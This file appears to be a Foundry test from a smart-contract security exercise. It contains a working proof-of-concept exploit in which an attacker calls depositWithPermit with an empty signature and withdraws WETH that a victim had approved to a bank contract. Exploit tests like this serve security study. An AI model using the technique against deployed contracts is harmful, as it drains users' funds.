// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {Test, console2} from "forge-std/Test.sol";
import {WETH} from "../src/WETH.sol";
import {ERC20Bank} from "../src/ERC20Bank.sol";

contract ERC20BankExploitTest is Test {
    WETH private weth;
    ERC20Bank private bank;
    address private constant user = address(11);
    address private constant attacker = address(12);

    function setUp() public {
        weth = new WETH();
        bank = new ERC20Bank(address(weth));

        deal(user, 100 * 1e18);
        vm.startPrank(user);
        weth.deposit{value: 100 * 1e18}();
        weth.approve(address(bank), type(uint256).max);
        bank.deposit(1e18);
        vm.stopPrank();
    }

    function test() public {
        uint256 bal = weth.balanceOf(user);
        vm.startPrank(attacker);
        bank.depositWithPermit(user, attacker, bal, 0, 0, "", "");
        bank.withdraw(bal);
        vm.stopPrank();

        assertEq(weth.balanceOf(user), 0, "WETH balance of user");
        assertEq(
            weth.balanceOf(address(attacker)),
            99 * 1e18,
            "WETH balance of attacker"
        );
    }
}
